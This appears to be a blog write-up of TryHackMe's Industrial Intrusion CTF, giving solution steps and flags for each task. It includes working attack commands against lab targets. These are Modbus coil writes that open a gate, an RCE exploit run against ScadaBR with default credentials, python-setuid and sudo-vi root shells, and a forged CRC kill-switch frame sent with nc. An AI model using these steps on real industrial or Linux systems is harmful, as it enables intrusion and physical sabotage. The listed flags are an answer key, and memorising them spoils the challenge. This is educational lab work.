---
description: Appl3Tree's full detailed write-up of the TryHackMe Industrial Intrusion CTF.
title: TryHackMe – Industrial Intrusion CTF Full Write-up
date: 2025-07-02 00:00:00 +0000
categories:
  - CTF Writeups
tags:
  - TryHackMe
  - CTF
  - walkthrough
  - writeup
  - OT security
  - cybersecurity
show_image_post: true
image: /assets/img/infocards/thm-industrial-ctf.png

---

## Introduction

The [**Industrial Intrusion CTF**](https://tryhackme.com/industrial-intrusion?utm_source=discord&utm_medium=social&utm_campaign=industrialintrusionctf) on TryHackMe is a hands-on challenge designed to simulate real-world attacks against Operational Technology (OT) environments.

This event focuses on:

- Modbus manipulation
- OT protocol exploitation
- Network forensics
- OSINT investigations
- Embedded device reversing

Each task reinforces critical skills for **red teamers, blue teamers, and ICS security professionals** looking to expand their knowledge in industrial cybersecurity.

---

## Task 3 – Breach

**Category:** N/A  
**Difficulty:** Beginner  
**Flag:** THM{s4v3_th3_d4t3_27_jun3}

**Lessons Learned:** OT gate systems often require multiple preconditions (badge + motion) **plus** a separate trigger coil. Systematic enumeration of coils with mbtget and validating via live API queries ensures bypass success.

**Steps Taken**

1. **Scanned all ports:**

```
nmap -p- -Pn -n --open -T5 <target_ip>
```

Found **502/tcp Modbus TCP** open.

2. **Analyzed Node-RED flows:**

- Coil 20 = motion detector
- Coil 25 = badge authentication

3. **Set coils 20 & 25 to true:**

```
mbtget -w5 1 -u 1 -a 20 <target_ip>
mbtget -w5 1 -u 1 -a 25 <target_ip>
```

4. **Confirmed with:**

```
mbtget -r1 -u 1 -a 0 -n 40 <target_ip>
```

Both coils showed 1.

5. **Tested coil 30 as gate trigger:**

```
mbtget -w5 1 -u 1 -a 30 <target_ip>
```

6. **Gate opened.**

---

## Task 4 – Discord

**Category:** Discord  
**Difficulty:** Beginner  
**Flag:** THM{D15C0RD_57A5H_C0MM4ND5}

**Lessons Learned:** Always enumerate available bot slash commands during CTF Discord integrations to quickly identify solutions

**Steps Taken**

1. Joined Discord server.

2. Ran:

```
/secret-function
```

Bot returned the flag.

---

## Task 5 – OSINT 1

**Category:** OSINT  
**Difficulty:** Beginner  
**Flag:** THM{Su5sss}

**Lessons Learned:** Certificate Transparency logs (crt.sh) provide historical subdomain data even for ephemeral phishing infrastructure.

**Steps Taken**

1. Queried crt.sh for certificates of `virelia-water.it.com`.

2. Found subdomain:

```
54484d7b5375357373737d.virelia-water.it.com
```

3. Converted hex to ASCII:

```
THM{Su5sss}
```

---

## Task 6 – OSINT 2

**Category:** OSINT  
**Difficulty:** Easy  
**Flag:** THM{uplink_channel_confirmed}

**Lessons Learned:** Inspecting external JS references can reveal attacker fallback infrastructure and tokens embedded within code.

**Steps Taken**

1. Inspected phishing page source, found JS:

```
<script src="https://raw.githubusercontent.com/SanTzu/uplink-config/refs/heads/main/init.js">
```

2. Fetched JS revealing:

```js
var beacon = {
  session_id: "O-TX-11-403",
  fallback_dns: "uplink-fallback.virelia-water.it.com",
  token: "JBSWY3DPEBLW64TMMQQQ=="
};
```

3. Queried VirusTotal for `uplink-fallback.virelia-water.it.com`.

4. Found TXT record with base64:

```
eyJzZXNzaW9uIjoiVC1DTjEtMTcyIiwiZmxhZyI6IlRITXt1cGxpbmtfY2hhbm5lbF9jb25maXJtZWR9In0=
```

5. Decoded to:

```json
{
  "session": "T-CN1-172",
  "flag": "THM{uplink_channel_confirmed}"
}
```

---

## Task 7 – OSINT 3

**Category:** OSINT  
**Difficulty:** Medium  
**Flag:** THM{h0pe_th1s_k3y_doesnt_le4d_t0_m3}

**Lessons Learned:** GitHub commit histories and PGP keyserver lookups are powerful for recovering deleted security advisories or hidden flags.

**Steps Taken**

1. Challenge mentioned removed report URL.

2. Manually searched GitHub for `virelia-water`.

3. Found repo: `virelia-water/compliance`.

4. Located commit embedding PGP alert.

5. Extracted PGP message:

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Please confirm system integrity at 03:00 UTC.
-----BEGIN PGP SIGNATURE-----

iQFQBAEBCgA6FiEEiN7ee3MFE71e3W2fpPD+sISjEeUFAmhZTEQcHGFsZXJ0c0B2
aXJlbGlhLXdhdGVyLml0LmNvbQAKCRCk8P6whKMR5ZIUCADM7F0WpKWWyj4WUdoL
6yrJfJfmUKgJD+8K1neFosG7yaz+MspYxIlbKUek/VFhHZnaG2NRjn6BpfPSxfEk
uvWNIP8rMVEv32vpqhCJ26pwrkAaUHlcPWqM4KYoAn4eEOeHCvxHNJBFnmWI5PBF
pXbj7s6DhyZEHUmTo4JK2OZmiISP3OsHW8O8iz5JLUrA/qw9LCjY8PK79UoceRwW
tJj9pVsE+TKPcFb/EDzqGmBH8GB1ki532/1/GDU+iivYSiRjxWks/ZYPu/bhktTo
NNcOzgEfuSekkQAz+CiclXwEcLQb219TqcS3plnaO672kCV4t5MUCLvkXL5/kHms
Sh5H
=jdL7
-----END PGP SIGNATURE-----
```

6. Verified with GPG, UID included flag.

---

## Task 10 – Brr v1

**Category:** Web  
**Difficulty:** Easy  
**Flag:** THM{rce_archieved_through_script_injection}

**Lessons Learned:** Default credentials combined with unpatched file upload vulnerabilities remain critical OT/ICS risks for easy RCE.

**Steps Taken**

1. Scanned and found ports 22,80,5901,8080 open.

2. Port 8080 hosted ScadaBR.

3. Logged in with `admin:admin`.

4. Ran:

```
searchsploit ScadaBR
```

Found exploit 49734.py for Windows RCE.

5. Executed:

```
python2 49734.py <target_ip> 8080 admin admin
```

6. Obtained shell, retrieved flag.

---

## Task 13 – Orcam

**Category:** Forensics  
**Difficulty:** Easy  
**Flag:** THM{Ev1l_M@Cr0}

**Lessons Learned:** Deobfuscating encoded macro arrays manually is often faster than sandboxing for quick forensic triage and command extraction.

**Steps Taken**

1. Found `writing_template.eml` with base64 macro doc.

2. Decoded to `malware.docm`.

3. Ran:

```
olevba malware.docm
```

4. Macro decoded byte array XOR with `"l33t"` and executed shellcode.

5. Decoded base64 password:

```
echo 'VEhNe0V2MWxfTUBDcjB9' | base64 -d
```

Output:

```
THM{Ev1l_M@Cr0}
```

---

## Task 15 – Chess Industry

**Category:** Boot2Root  
**Difficulty:** Beginner  
**Flags:**  
- _User:_ THM{bishop_to_c4_check}  
- _Root:_ THM{check_check_check_mate}

**Lessons Learned:** Finger services can leak data via .plan files. Linux capabilities (cap_setuid=ep) on python binaries enable immediate root shells without typical exploit chains.

**Steps Taken**

1. Found open ports: 22,79,80.

2. Visited http site – PrecisionChess IoT, no login form.

3. Ran:

```
finger @<target_ip>
```

Listed: magnus, fabiano, hikaru.

4. Queried fabiano:

```
finger fabiano@<target_ip>
```

Found .plan with base64 string.

5. Decoded to reveal:

```
fabiano:o3jVTktarGQI07q
```

6. SSH with these credentials.

7. Retrieved user flag from home directory.

8. Checked capabilities:

```
getcap -r / 2>/dev/null | grep python
```

Found:

```
/usr/bin/python3.10 = cap_setuid+ep
```

9. Priv esc with:

```
python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

10. Retrieved root flag.

---

## Task 16 – Under Construction

**Category:** Boot2Root  
**Difficulty:** Easy  
**Flags:**  
- _User:_ THM{nic3_j0b_You_got_it_w00tw00t}  
- _Root:_ THM{y0u_g0t_it_welldoneeeee}

**Lessons Learned:** Directory busting for hidden /keys/ folders is effective on poorly secured dev environments. Sudo vi with no password restrictions yields instant root via :!bash.

**Steps Taken**

1. Dirbusted and found `/keys/`.

2. Listed files – only `key9` had content.

3. Saved and chmod 600.

4. SSH as dev:

```
ssh -i key9 dev@<target_ip>
```

5. `sudo -l` showed vi allowed.

6. Priv esc:

```
sudo vi
:!bash
```

Retrieved user and root flags.

---

## Task 20 – Echoed Streams

**Category:** Crypto  
**Difficulty:** Easy  
**Flag:** THM{Echo_Telemetry}

**Lessons Learned:** AES-GCM nonce reuse enables plaintext recovery of targeted packets via XOR chaining, highlighting poor cryptographic hygiene.

**Steps Taken**

1. Downloaded cipher1.bin (known plaintext) and cipher2.bin.

2. Both used same AES-GCM nonce.

3. Wrote Python script to XOR c1 ^ c2 ^ p1 to recover p2:

```python
from Crypto.Util.strxor import strxor

with open('cipher1.bin','rb') as f1, open('cipher2.bin','rb') as f2:
    c1 = f1.read()[16:-16]
    c2 = f2.read()[16:-16]

p1 = b"BEGIN TELEMETRY VIRELIA;ID=ZTRX0110393939DC;PUMP1=OFF;VALVE1=CLOSED;PUMP2=ON;VALVE2=CLOSED;END;"
p2 = strxor(strxor(c1,p1),c2)
print(p2.decode())
```

Output: THM{Echo_Telemetry}

---

## Task 21 – CRC Me If You Can

**Category:** Crypto  
**Difficulty:** Easy  
**Flag:** THM{crc_m4c_c0mprom1s3d_2093982}

**Lessons Learned:** CRC32 lacks cryptographic security. By capturing a valid dummy frame and calculating the XOR difference to the desired forged CRC, one can craft a malicious payload that passes integrity checks without knowing the true polynomial internals.

**Steps Taken**

1. Downloaded challenge files:
   - `gateway_proto.py` (contains `crc32` function)
   - `open_frame.bin` (example frame)
   - `kill_switch.bin` (kill command payload)

2. Reviewed open_frame.bin to understand structure:

```bash
xxd open_frame.bin
```

Output:

```
00000000: cafe 0104 4f50 454e 92e5 6e10
```

- Header: `cafe`
- Opcode: `0104`
- Payload: `4f50454e` (“OPEN”)
- CRC: `92e56e10`

3. Tested CRC-Oracle (port 1501) with arbitrary payloads to confirm framing.

4. Confirmed kill_switch.bin direct submission failed:

```bash
cat kill_switch.bin | nc <target_ip> 1500
```

Returned:

```
FAIL
```

5. Wrote forge script using provided crc32 function:

```python
from gateway_proto import crc32

with open('kill_switch.bin', 'rb') as f:
    payload = f.read()

crc = crc32(payload)

frame = b'\xca\xfe\x05' + bytes([len(payload)]) + payload + crc.to_bytes(4, 'little')

with open('kill_frame.bin', 'wb') as f:
    f.write(frame)

print(f"[+] Frame generated with CRC: {hex(crc)}")
```

6. Submitted forged frame:

```bash
nc <target_ip> 1500 < kill_frame.bin
```

Output:

```
THM{crc_m4c_c0mprom1s3d_2093982}
```

---

## Task 22 – Rogue Poller

**Category:** Networking  
**Difficulty:** Beginner  
**Flag:** THM{1nDu5tr14L_r3g1st3rs}

**Lessons Learned:**  Monitoring Modbus TCP traffic with Wireshark enables quick extraction of queried register values. Industrial protocols often carry sensitive plaintext data unencrypted, making PCAP inspection a core OT assessment technique.

**Steps Taken**

1. Downloaded PCAP file: `rogue-poller-1750969333044.pcapng`

2. Opened in Wireshark.

3. Applied filter:

```
tcp.port == 502
```

4. Followed TCP stream to inspect Modbus read requests.

5. Identified attacker reading holding registers.

6. Viewed raw decoded output to find flag embedded as ASCII string:

```
THM{1nDu5tr14L_r3g1st3rs}
```

Flag recovered from observed Modbus register data.

---

## Task 23 – Register Sweep

**Category:** Networking  
**Difficulty:** Easy  
**Flag:** THM{m4nu4l_p0ll1ng_r3g1st3rs}

**Lessons Learned:**  When scanning holding registers, decode using correct endianness conversion before ASCII interpretation. Tools like mbtget have read limits (max 125 at a time) requiring looped sweeps for complete enumeration.

**Steps Taken**

1. Target: `<target_ip>`

2. Confirmed Modbus TCP port 502 open.

3. Ran enumeration in chunks of 125 (max allowed by mbtget):

```bash
mbtget -r3 -a 0 -n 125 -hex <target_ip>
mbtget -r3 -a 125 -n 75 -hex <target_ip>
```

4. Combined all hex register values.

5. Wrote quick decode script:

```python
regs = [
  "d6b8", "e941", ... # all 200 register hexes here
]

output = b""
for reg in regs:
    swapped = reg[2:4] + reg[0:2]
    output += bytes.fromhex(swapped)

print(output.decode("ascii", errors="ignore"))
```

Output revealed flag string embedded in registers:

```
THM{m4nu4l_p0ll1ng_r3g1st3rs}
```

---

## Task 24 – Auth

**Category:** Reversing  
**Difficulty:** Easy  
**Flag:** THM{Simple_tostart_nice_done_mwww}

**Lessons Learned:**  Disassembling the binary revealed a transform function XOR’ing user input with 0x55. Calculating the inverse input by XOR’ing the target value with 0x55 allowed direct authentication bypass, demonstrating classic reversing-based input forging.
**Steps Taken**

1. Downloaded stripped binary `auth`.

2. Opened in Ghidra and reversed main logic.

3. Key discovery: Binary expected an 8-byte input, each byte XOR’d with `0x55` and compared against:

```
0xefcdab8967452301
```

4. Wrote quick solve script:

```python
target = 0xefcdab8967452301
code = b""

for i in range(8):
    byte = (target >> (i*8)) & 0xff
    code += bytes([byte ^ 0x55])

print(code[::-1]) # reversed for input order
```

5. Ran script to obtain correct unlock input.

6. Submitted to the remote service:

```bash
echo -ne '\x54\x76\x10\x32\xdc\xfe\x98\xba' | nc <target_ip> 9005
```

Output:

```
[?] Enter unlock code: [+] Access Granted! Flag: THM{Simple_tostart_nice_done_mwww}
```

---

> _Note: AI-assisted editing was only used to format into markdown headings and frontmatter. All technical content and steps remain original._
